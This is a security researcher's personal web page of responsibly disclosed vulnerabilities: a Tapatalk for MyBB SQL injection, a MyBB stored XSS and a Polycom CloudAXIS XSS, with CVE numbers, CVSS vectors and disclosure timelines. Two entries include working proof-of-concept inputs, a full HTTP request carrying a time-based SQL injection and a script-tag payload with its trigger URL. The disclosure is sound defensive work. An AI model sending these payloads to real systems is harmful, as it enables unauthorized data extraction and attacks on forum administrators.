<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<title>Adrian Hayter - Exploits</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="Content-Language" content="en" />
	<meta name="author" content="Adrian Hayter" />
	<meta name="description" content="The personal website of Adrian Hayter." />
	<meta name="keywords" content="adrian hayter, adrian, hayter, computer science, information security, cryptography, ethical hacking, penetration tester, penetration testing" />
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" /> 
	<link rel="stylesheet" href="/inc/style.css" type="text/css" />
	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-4399924-4']);
		_gaq.push(['_setDomainName', '.adrianhayter.com']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  		})();
	</script>
</head>
<body>
	<div id="container">
		<div id="nav">
			<ul>
				<li><a href="/index.php">About</a></li><li><a href="/projects.php">Projects</a></li><li><a href="/exploits.php">Exploits</a></li><li><a href="/contact.php">Contact</a></li>
			</ul>
		</div>
		<div id="main">
			<div id="photo"><img src="images/me.jpg" alt="Adrian Hayter" title="Adrian Hayter" /></div>
			<div id="content">
				<h1>Exploits</h1>
				The following exploits were found by myself and responsibly disclosed to all relevant parties before their public disclosure here.<br /><br />
				<a name="CVE-2017-14652"></a><h2>Tapatalk for MyBB Plugin SQL Injection Vulnerability (<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-14652" target="_blank">CVE-2017-14652</a>)</h2><br />
				A time-based blind SQL injection exists in the mobiquo/lib/classTTForum.php file in the Tapatalk for MyBB Plugin, for versions prior to 4.5.8. The vulnerability allows an unauthenticated user to inject SQL as part of the user registration process. The injection occurs within a SELECT statement and as such could be used to extract data from the database.<br /><br />
				<strong>CVSS v2 Vector:</strong> (AV:N/AC:L/Au:N/C:P/I:P/A:P)<br /><br />
				<h3>Proof of Concept</h3><br />
				Set the correct host header on the below request and send it to a MySQL based installation of MyBB with the Tapatalk plugin installed.
				<pre>POST /mobiquo/mobiquo.php HTTP/1.1
Host: &lt;insert-correct-host-header&gt;
Accept: */*
mobiquoid: 2
Mobiquo_id: 2
Accept-Language: en-us
Content-Type: text/xml
Content-Length: 498
Connection: keep-alive
Cookie: tapatalk=1
TT-VERSION: 1844

&lt;methodCall&gt;&lt;methodName&gt;sign_in&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;base64&gt;dGVzdEBleGFtcGxlLmNvbQ==&lt;/base64&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;base64&gt;dXNlcm5hbWU=&lt;/base64&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;base64&gt;cGFzc3dvcmQ=&lt;/base64&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test' AND SLEEP(10) -- a&lt;/name&gt;&lt;value&gt;&lt;base64&gt;dGVzdA==&lt;/base64&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</pre>
                If successful the MySQL instance should sleep for 10 seconds.<br /><br />
                <h3>Timeline</h3><br />
                July 30th 2017 - Vulnerability discovered and disclosed privately to Tapatalk.<br />
                July 31st 2017 - Vulnerability fixed in <a href="https://www.tapatalk.com/groups/tapatalksupport/tapatalk-for-mybb-plugin-release-announcement-and--t5877-s50.html#p187116">Tapatalk for MyBB Plugin v4.5.8</a>.<br />
                Sept 12th 2017 - Vulerability disclosed publicly here.<br /><br /><hr /><br />
				<a name="CVE-2015-4552"/></a><h2>MyBB Cross-site Scripting (XSS) Vulnerability (<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-4552" target="_blank">CVE-2015-4552</a>)</h2><br />
				A persistent Cross-site Scripting (XSS) vulnerability exists in the /xmlhttp.php file in MyBB (aka MyBulletinBoard) versions before 1.8.5 which allows remote attackers	(authenticated and in some cases unauthenticated) to inject arbitrary web script or HTML into their posts. Whilst the injected code is not	rendered in posts themselves, if the post's quick edit AJAX URL is opened in a browser window, the injected code would be rendered. Since administrators / moderators can use the quick edit feature on any posts, this vulnerability could be used to target administrator / moderator accounts.<br /><br />
				<strong>CVSS v2 Vector:</strong> (AV:N/AC:L/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C)<br /><br />
				<h3>Proof of Concept</h3><br />
				Create a post with the content set to:
				<pre>&lt;script&gt;alert(1)&lt;/script&gt;</pre>
				Get the ID of the post from the HTML (there are numerous locations where it is used) and use it in the following URL:
				<pre>http://example.com/xmlhttp.php?action=edit_post&amp;do=get_post&amp;pid=ENTER_POST_ID_HERE</pre>
				Open the URL in a browser window. The JavaScript should execute and create an alert box with the contents "1". This URL will work for the user who created the post, administrators, super moderators, and moderators with permissions to edit posts in the forum the post was made. All other users will see a permissions error.<br /><br />
				<h3>Timeline</h3><br />
				April 28th 2015 - Vulnerability discovered and disclosed privately to MyBB team.<br />
				April 29th 2015 - Vulnerability report accepted and bug confirmed by MyBB team.<br />
				May 27th 2015 - Vulnerability fixed as part of <a href="https://blog.mybb.com/2015/05/27/mybb-1-8-5-1-6-17-merge-system-1-8-5-release/">MyBB 1.8.5</a>.<br />
				June 15th 2015 - Vulnerability disclosed publicly here.<br /><br /><hr /><br />
				<a name="CVE-2015-1516"></a><h2>Polycom RealPresence CloudAXIS Suite Cross-site Scripting (XSS) Vulnerability (<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1516" target="_blank">CVE-2015-1516</a>)</h2><br />
				A persistent Cross-site Scripting (XSS) vulnerability exists in Polycom RealPresence CloudAXIS Suite versions prior to 1.7.0 which allows a remote authenticated user to inject arbitrary JavaScript or HTML into the application. Injected code is rendered and executed by a victim's web browser as soon as they join the session.<br /><br />
				This vulnerability was found whilst working for <a href="https://www.hut3.net" target="_blank">CNS Hut3</a>.<br /><br />
				<strong>CVSS v2 Vector:</strong> (AV:N/AC:L/Au:S/C:N/I:P/A:N/E:POC/RL:OF/RC:C)<br /><br />
				<h3>Timeline</h3><br />
				Sept 16th 2014 - Vulnerability discovered.<br />
				Nov 20th 2014 - Vulnerability disclosed to Polycom Security Team.<br />
				Dec 12th 2014 - Vulnerability report accepted and bug confirmed as fixed pending testing and verification.<br />
				April 2015 - Vulnerability fixed as part of 1.7.0 update.<br />
				June 18th 2015 - Vulnerability disclosed publicly here.
			</div>
		</div>
	</div>
</body>
</html>
